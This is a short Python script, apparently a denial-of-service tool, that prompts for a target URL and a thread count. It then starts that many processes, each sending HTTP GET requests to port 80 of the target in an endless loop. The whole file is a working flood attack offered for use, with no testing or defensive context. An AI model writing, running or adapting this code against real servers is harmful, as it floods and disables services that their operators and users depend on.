import socket
import multiprocessing

ip = input("\u001b[31murl : \u001b[0m")

th = int(input("\u001b[31menter thread(default-356) : \u001b[0m"))

re = "GET / HTTP/1.1\nHost:"+ip+"\r\n\r\n"


def att():
    s = socket.socket()
    s.connect((ip, 80))
    s.sendall(re.encode())
    s.recv(10000)
    s.close()
    print("\u001b[32msending...\u001b[0m")

def run():
    while True:
        att()

for _ in range(th):
    print("\u001b[33mBuilding package..\u001b[0m")
    t = multiprocessing.Process(target=run)
    t.start()






